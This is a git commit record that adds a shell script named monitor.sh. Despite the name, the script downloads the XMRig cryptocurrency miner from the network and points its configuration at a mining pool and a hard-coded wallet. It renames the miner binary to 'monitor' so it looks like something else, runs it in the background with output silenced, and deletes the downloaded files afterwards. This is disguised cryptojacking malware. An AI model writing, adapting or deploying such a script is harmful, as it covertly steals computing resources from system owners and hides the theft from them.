e5b7cd3f66af3bf12f16d00cc916989a48339db0
dengdeng <rld_1981@163.com>
2019-05-30 11:23:53 +0800

    Create monitor.sh

---
+++ monitor.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+cd /tmp
+wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
+tar xvf xmrig-2.14.1-xenial-x64.tar.gz
+cd  xmrig-2.14.1
+sed -i "s/donate.v2.xmrig.com:3333/mine.c3pool.com:19999/g" config.json
+sed -i "s/YOUR_WALLET_ADDRESS/41tYfhLer7d4X923KmM7ZRTNeLpec1KYDC1bQjQmQiiPAjgmsVLnJkMP4VrXHj51KUMkSmKQsvozg5Wv5K5ZJ9DQ38ap9wL/g" config.json
+sed -i "s/100/75/g" config.json
+sed -i "s/\"test\"/\"`hostname`\"/g" config.json
+mv xmrig monitor
+nohup ./monitor  >/dev/null 2>&1 &
+cd ..
+sleep 30
+rm -rf /tmp/xmrig-2.14.1 xmrig-2.14.1-xenial-x64.tar.gz
